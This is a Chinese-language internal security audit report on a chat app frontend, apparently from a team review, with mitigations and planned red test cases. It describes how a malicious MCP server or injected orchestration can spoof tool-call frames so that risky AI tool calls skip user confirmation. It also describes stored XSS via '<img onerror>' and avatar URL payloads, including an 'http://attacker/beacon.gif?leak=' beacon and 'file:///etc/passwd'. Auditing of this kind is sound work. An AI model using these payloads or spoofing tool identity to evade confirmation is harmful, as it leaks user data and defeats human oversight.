# SEC-INVESTIGATION-001 — findings: dev-chat-core

调查人：pupu-dev-chat-core
范围：src/PAGEs/chat/（含 use_chat_stream.js）、chat-input/、side-menu/、相关 persister
性质：只读调查，未改任何代码。severity 为初判，待守统一复核。
主责边界：③ 内容入口与流式编排（消费 ② 的 SSE，渲染 ③ 的模型/MCP 输出）。

---

## 清单逐项

### 清单项 1 — SSE 帧信任假设（onFrame/onToken/onDone）

总体：帧字段的类型校验做得相当扎实——use_chat_stream.js 的 onFrame 大循环里几乎每个
frame.payload.* 读取都包了 typeof==="string" / Array.isArray / typeof==="object" 守卫
（见 2138-2480、2610-2900）。token/done/error/subagent 等帧只驱动 UI 状态与日志，不触发本地
写入或本机能力。这一项主体已查，结构信任假设健康——但有两个具体暗角拆成下面的 finding。

---

#### F-CC-01 — 工具确认门控完全由后端帧自声明决定，前端无独立兜底

[H] [verified] [boundary ③(源头) / ②(载体)]
src/PAGEs/chat/hooks/use_chat_stream.js:2342-2344, 2619-2621, 2679
—— requires_confirmation 仅取自帧字段，前端无白名单兜底

- 代码：
  - 2342-2344 / 2619-2621：
    requiresConfirmation = frame.payload?.requires_confirmation === true || Boolean(confirmationId)
  - 2679：if (callId && confirmationId && requiresConfirmation) 才登记/弹确认。
- 含义：是否需要用户确认，100% 由后端帧的自声明字段决定。前端没有任何"危险工具默认必须确认"
  的本地白名单兜底。
- exploit 场景：被注入的编排 / 恶意 MCP（边界③）让某个高危工具调用的帧不带 requires_confirmation、
  不带 confirmation_id ——前端就当它"无需确认"，不弹框，直接进入自动放行路径。源头在③，污染经②的
  SSE 帧灌进来。
- 关键认知：确认门控的真相源必须在服务端（unchain_adapter，清单7-6，llm-expert 联合点）。前端这层
  只是"忠实呈现后端判定"，本身防不住一个声称"我不用确认"的工具。前端至少应有一份"危险工具/能力→强制
  确认"的本地兜底白名单作为纵深防御第二道闸。
- mitigation：
  1. 服务端（清单7-6）必须是确认判定唯一真相源，默认拒绝、显式白名单放行——主修点。
  2. 前端补兜底：对已知高危 toolkit/tool（fs 写、shell、网络）即便帧说"不用确认"也强制弹框。
     改 isToolCallAutoApprovable 与 2342/2619 判定。
  3. 红用例：构造 requires_confirmation 缺省/为 false 的高危 tool_call 帧，断言前端仍弹确认。
- 跨边界，跨层接缝：与 llm-expert（清单7-6）+ CTO 联合，建议进同步会。

---

#### F-CC-02 — 自动放行依据帧自报的 toolkit_id:tool_name，前端无法核验帧身份与真实动作一致

[H] [verified] [boundary ③]
src/PAGEs/chat/hooks/use_chat_stream.js:1001-1022, 1014-1016, 846, 2424, 2699
—— session/持久 auto-approve 以帧自报的 toolkit_id:tool_name 为键匹配，可被冒名复用

- 代码：
  - 1006-1009：auto-approve 判定从 frame.payload.toolkit_id / tool_name 取值。
  - 1014-1016：sessionAutoApproveRef.has(`${toolkitId}:${toolName}`)。
  - 1017-1021：isToolAutoApproved(toolkitId, toolName) || isSessionAllowed → 命中即
    submitAutoApprovedToolConfirmation（1052，直接 approved:true 回传，不弹框）。
  - 846：用户点"Don't ask again"时也以帧自报的 `${toolkitId}:${toolName}` 入 session 集合。
- 含义：用户对 toolkitA:read_file 授过"本会话别再问"，后续任何自报为 toolkitA:read_file 的帧都被
  静默自动放行。前端无法验证帧自报身份是否对应真实底层动作。
- exploit 场景：恶意编排（边界③）观察到用户已 session-approve 某无害工具，随后把高危动作的 tool_call
  帧冒名成同一 toolkit_id:tool_name，前端直接 auto-submit、无弹框、用户无感。持久化 auto-approve
  （isToolAutoApproved，toolkit dev 清单4-4 拥有的 store）放大此面。
- mitigation：
  1. 同 F-CC-01：服务端是真相源，自动放行也必须服务端复核身份，前端 auto-approve 只能是"少弹一次框"
     的体验优化，不能是安全决策。
  2. auto-approve 键应绑定服务端可核验的稳定标识（如服务端签发的 tool fingerprint），而非帧自报字符串。
  3. 红用例：approve tk:safe_tool 后，灌入冒名 tk:safe_tool 但底层 args 指向危险动作的帧，断言不被
     静默放行。
- 跨边界 + 跨层接缝：与 llm-expert / toolkit dev / CTO 联合。

---

### 清单项 2 — 工具确认门控客户端侧

→ 已并入 F-CC-01 / F-CC-02（即本清单核心热点）。客户端侧确认逻辑本身写得稳（id 归一化、去重、超时
清理都在），问题不在实现 bug，而在信任模型：前端把后端帧当门控真相源。已查，定级 H，主修在服务端。

---

### 清单项 3 — 本地持久化写入的来源（持久化即注入时间机器）

#### F-CC-03 — 模型/工具输出原文落 localStorage，回放时交给默认不清洗 HTML 的 markdown sink

[H] [verified 链路] [boundary ③]
src/PAGEs/chat/hooks/background_stream_persister.js:1 + finalize_stream_persist.js
经 setChatMessages → chat_storage_sanitize.sanitizeMessage（仅结构清洗）
—— 消息 content 原文持久化，未做 HTML 清洗

- 链路：两个 persister 都经 setChatMessages（chat_storage 专用 helper，合规——未绕过 SERVICEs）。
  chat_storage_sanitize.js 的 sanitizeMessage(566)/sanitizeMessages(686) 只做结构/长度清洗，不剥离
  content 里的 HTML/script（grep content×html/strip/escape 无命中）。
- 含义：模型/MCP 输出的原始文本（可含 <img onerror> 等）被忠实存进 localStorage，未来会话读回，交给
  chat-bubble 渲染。
- exploit 场景：①恶意 MCP/模型输出嵌 HTML payload → ②存进 localStorage → ③下次打开会话读回 →
  ④chat-bubble 的 markdown 渲染器若 sanitize_html 默认 false（清单3 头号热点，bubble dev 主责）则
  XSS。注入跨会话存活、回放时触发。
- 边界归属：存储这端（我）忠实存原文是设计正确的（不该在存储层吃掉用户内容）；真正的 sink 在
  chat-bubble 的渲染器（清单3-1）。本条价值是确认了"时间机器"链路成立——污染能存活并被回放。
- mitigation：主修在 chat-bubble（渲染时 sanitize_html={true}）。我侧无需在存储层清洗（会破坏内容
  保真），但应在同步会上与 bubble dev 对齐"存原文 / 渲染时清洗"的责任边界。
- 跨边界，与清单3-1 同源。建议同步会点名 bubble dev。

---

### 清单项 4 — 输入面板的附件/粘贴路径

[—] 已查，无 finding（boundary ② 路径遍历发起点：不成立）
src/PAGEs/chat/hooks/use_chat_attachments.js:268-365
src/COMPONENTs/chat-input/hooks/use_file_drop_overlay.js

- 附件走 readFileAsDataUrl（浏览器 File API → base64 data URL），payload 里只带 base64 data +
  filename 标签（342-365），不带任何本地文件系统路径。filename 仅作展示标签，不进路径拼接。
- 拖拽（use_file_drop_overlay.js）只接收 dataTransfer.files File 对象，同样走 data-URL 路径。
- 无 onPaste 注入 HTML、无 contentEditable、无 execCommand（grep 全空）。
- 结论：输入侧不是路径遍历的发起点，附件不携带可控本地路径。已查无 finding。

---

### 清单项 5 — side-menu 渲染会话标题/树

#### 5a — 标题/树文本渲染：已查，无 finding

- side_menu.js:186 {node.label}、154/149 characterName、770 confirmDelete.node?.label 全部作为
  JSX 文本子节点 / alt 属性渲染（React 自动转义）。side-menu 全目录 grep
  dangerouslySetInnerHTML|innerHTML|Markdown|ReactShowdown 无命中——未复用 markdown 渲染器。即使会话
  标题由模型生成，也不构成 XSS-类注入。已查无 finding。

#### F-CC-04 — 角色头像 src 未做 scheme 过滤，模型/导入角色可注入 file:/http:/data: URL（暗角，清单外补充）

[M] [verified] [boundary ③]
src/COMPONENTs/side-menu/side_menu.js:57-77 (resolveCharacterAvatarSrc) + :148 (<img src>)
配合 chat_storage_sanitize.js:349 sanitizeCharacterAvatar（不校验 scheme）
—— 角色头像 URL 原样进 <img src>，无 scheme 白名单

- 代码：
  - side_menu.js:58-61：avatar.url 原样返回进 <img src>，无任何过滤。
  - side_menu.js:70-76：absolute_path 分支显式允许 file:/data:，并把任意绝对路径拼成 file://...。
  - chat_storage_sanitize.js:349-371（CTO-gated，我是用户）：sanitizeCharacterAvatar 只
    trimText(...,4000)，不校验 scheme——恶意 URL 完整存活到我的 sink。
- exploit 场景：导入一张社区恶意角色卡（边界③，dev-agents 主责的数据，但渲染 sink 在我这）：
  - avatar.url = "http://attacker/beacon.gif?leak=<...>" → <img> 自动发起外联 = 追踪信标 /
    受害者 IP 泄漏 / 数据外带载体。
  - avatar.url = "file:///etc/passwd" 或 data:... → 本地文件被当图片加载 / data-URI 渲染。
- 数据归 dev-agents（角色卡导入校验）、sanitize 归 CTO（chat_storage），但 <img src> 这个 sink 是我
  side-menu 的——纵深防御我应在 sink 处加 scheme 白名单（只放 https: 与受信本地路径）。
- mitigation：
  1. resolveCharacterAvatarSrc 加 scheme 白名单：拒 http:（明文外联）/file:（本地读）/data:（除非
     显式信任），只放 https: 与 app 自管的本地头像路径。
  2. 上游（dev-agents 导入校验 + CTO 的 sanitizeCharacterAvatar）也应校验——纵深防御，三处都该有。
  3. 红用例：构造 avatar.url 为 file:/// 或 http:// 的角色，断言 side-menu 不发起外联、不加载本地文件。
- 跨边界，多 owner（dev-agents 数据 / CTO sanitize / 我 sink）。建议同步会。

---

## 我学到的隐患（攻击面认知）

1. 流式编排 hook 的"门控"不是安全控制，是呈现层。requires_confirmation 只是后端帧里的一个字段。前端
   onFrame 再怎么严格校验类型，也防不住一个语义上撒谎的帧（"我不用确认"/"我是你信任过的那个工具"）。
   类型校验 ≠ 信任校验——帧结构合法不代表帧内容可信。确认门控真相源必须在服务端，前端最多做纵深防御兜底。

2. localStorage 是注入的时间机器，而"忠实存原文"和"安全"是一对张力。存储层正确做法是不吃掉用户内容
   （保真），但这恰恰意味着污染能跨会话存活、在未来某次渲染时引爆。安全责任因此强制下移到渲染 sink——
   存储这端能做的只是确认链路、并和 bubble dev 把"存原文/渲染时清洗"的边界讲清，绝不能假设"反正存进去的
   时候看着没事"。

3. 我的地盘里渲染 sink 比我以为的多。我一直盯着 chat-bubble 的 markdown 是头号 sink，却忽略了 side-menu
   那个不起眼的 <img src={avatarSrc}>——它同样消费③内容（角色卡），且 <img src> 本身就是外联/本地读/
   data-URI 的现成载体，不需要 XSS 就能泄漏。凡是把③内容塞进任何 DOM 属性（src/href/style-url）的地方，
   都是 sink，不只是 HTML 注入点。

4. 跨 owner 的内容字段最危险的就是"每一棒都假设上一棒清洗过"。头像 URL 经过 dev-agents 导入 → CTO 的
   sanitizeCharacterAvatar → 我的 resolveCharacterAvatarSrc 三棒，结果三处都只管自己那段、没人校验
   scheme。纵深防御要求每个 sink 自己兜底，而不是相信上游——这正是守在接缝 A 里点的"双方都不校验=洞"。

---

## findings 统计

| severity | 数量 | 编号 |
|----------|------|------|
| Critical | 0 | — |
| High | 3 | F-CC-01, F-CC-02, F-CC-03 |
| Medium | 1 | F-CC-04 |
| Low | 0 | — |
| 已查无 finding | 2 | 清单项4（附件/粘贴）、清单项5a（标题/树文本） |

## 最重要的 1-2 条

1. F-CC-01 / F-CC-02（H）—— 工具确认门控的信任模型缺陷。前端是否弹确认、是否自动放行，完全依据后端 SSE
   帧的自声明字段（requires_confirmation、toolkit_id:tool_name），前端无独立白名单兜底，且无法核验帧自报
   身份与真实动作一致。一个会撒谎的工具/被注入的编排（边界③）可让高危调用绕过确认。主修在服务端
   （unchain_adapter 必须是真相源），需 llm-expert + CTO 同步会；前端补纵深防御兜底白名单。

2. F-CC-04（M）—— side-menu 角色头像 <img src> 无 scheme 过滤。恶意角色卡的 avatar.url
   （http:/file:/data:）原样进 <img>，构成外联信标 / 本地文件读 / 数据外带——一个被我长期忽视的非
   markdown 渲染 sink，且三棒 owner 无人校验 scheme。
